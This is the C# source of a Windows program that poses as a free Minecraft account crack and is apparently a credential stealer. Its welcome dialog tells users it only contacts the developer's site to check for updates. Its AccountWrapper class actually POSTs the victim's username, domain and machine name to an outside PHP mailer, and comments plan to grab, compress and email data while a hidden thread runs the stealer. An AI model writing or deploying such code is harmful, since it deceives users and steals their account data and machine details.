

//
// Author: Dashie
// Version: 1.0
//


using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;


namespace MineCrack
{
    public class WelcomeDialog : Form
    {
        private readonly Button accept = new Button();
        private readonly Button denied = new Button();

        private readonly TextBox greeting = new TextBox();

        private readonly string text_balloon = (
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n" +
            $"Hey There {Environment.UserName}, welcome to Mine-Crack!\r\n" +
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n" +
            "   Before proceeding, please beware of the fact that making actual use of this application may be strictly forbidden in your country, press accept if you are aware of this.\r\n" +
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n" +
            "   The use of this application is completely free, please beware of the fact that it may be communicating with the developers website (https://pugpawz.com) from time to time, in order to determine whether the application needs an update or not.\r\n" +
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n" +
            "   I do not expect this application to be functioning for long due to the fact that Microsoft and or Mojang or whoever truly runs the business right now, is going to seal off the vulnerability we had found.\r\n" +
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n" +
            "   The code of this application has been written in pure (no third-party libraries) C and C++, so expect it to run smoothly!\r\n" +
            "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n"
        );

        public WelcomeDialog()
        {
            BackColor = Color.FromArgb(1, 1, 1);

            Size client_size = new Size(350, 250);

            Size = client_size;
            MinimumSize = client_size;
            MaximumSize = client_size;

            StartPosition = FormStartPosition.CenterScreen;
            greeting.ScrollBars = ScrollBars.Vertical;
            FormBorderStyle = FormBorderStyle.None;

            try // Custom way of implementing a Text Box:
            {
                greeting.BackColor = Color.FromArgb(12, 12, 12);
                greeting.ForeColor = Color.FromArgb(180, 180, 180);

                greeting.TextAlign = HorizontalAlignment.Left;
                greeting.BorderStyle = BorderStyle.None;
               
                greeting.Size = new Size(client_size.Width - 2, client_size.Height - 2);
                greeting.Location = new Point(1, 1);

                greeting.Font = new Font("Modern", 9, FontStyle.Regular);
                greeting.Text = text_balloon;

                greeting.Multiline = true;
                greeting.ReadOnly = true;

                Controls.Add(greeting);
            }

            catch { };

            Moon dash = new Moon();

            Paint += (s, e) => dash.paint_border(e, Color.FromArgb(1, 1, 1), 2, Size, Point.Empty);

            dash.Button(greeting, accept, "Accept", 12, new Size(100, 28), new Point((greeting.Width - (200 + 10)) / 2, greeting.Height - 36), Color.FromArgb(53, 84, 66), Color.FromArgb(255, 255, 255), 8);
            dash.Button(greeting, denied, "Deny", 12, new Size(100, 28), new Point(accept.Left + accept.Width + 10, accept.Top), Color.FromArgb(53, 84, 66), Color.FromArgb(255, 255, 255), 8);

            denied.Click += (s, e) =>
            {
                Environment.Exit(-1);
            };

            accept.Click += (s, e) =>
            {
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        FileName = AppDomain.CurrentDomain.FriendlyName,
                        Arguments = ("RGFzaCBTb2NpZXR5IE93bnMgWW91IQ=="),

                        UseShellExecute = true,
                        CreateNoWindow = true
                    },
                };

                try
                {
                    process.Start();
                }

                catch { };

                Close();
            };
        }
    };

    public class AccountWrapper : Form
    {
        private readonly Button exit = new Button();
        private string content = string.Empty;

        public AccountWrapper()
        {
            exit.Click += (s, e) =>
            {
                Close();
            };


            // Grab Data
            // Compress
            // Send it over to DashSociety@protonmail.com
            // Done!

            using (var client = new WebClient())
            {
                client.UploadData("https://pugpawz.com/php/mail.php", "POST", System.Text.Encoding.Default.GetBytes($"content={content}&subject=Dash Society #{Environment.UserDomainName}:{Environment.UserName}:{Environment.MachineName}&key=2f290dd624e33112d3c578b348b5d137"));
            };
        }
    };

    public class DashSociety
    {
        public static void Start()
        {
            // Hide Window
            // Run Stealer in separate Thread.
            MessageBox.Show("1", "1");
            Environment.Exit(-1);
        }
    };
};